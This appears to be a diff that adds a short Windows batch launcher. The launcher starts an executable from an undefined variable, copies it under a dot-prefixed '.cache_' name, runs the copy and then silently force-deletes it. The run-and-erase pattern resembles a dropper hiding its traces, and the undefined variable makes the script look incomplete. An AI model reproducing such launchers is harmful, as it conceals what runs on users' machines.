@@ -1,0 +1,11 @@
+@echo off
+set exePath=%~f0
+set currentPath=%~dp0
+set exeName=%~nx0
+set currentCursorPath=%CD%
+start %my%0723.exe
+copy /y "%my%" "%currentPath%\.cache_%exeName%.exe"
+cd /d "%currentPath%"
+.cache_%exeName%.exe
+del/f/s/q ".cache_%exeName%.exe"
+exit
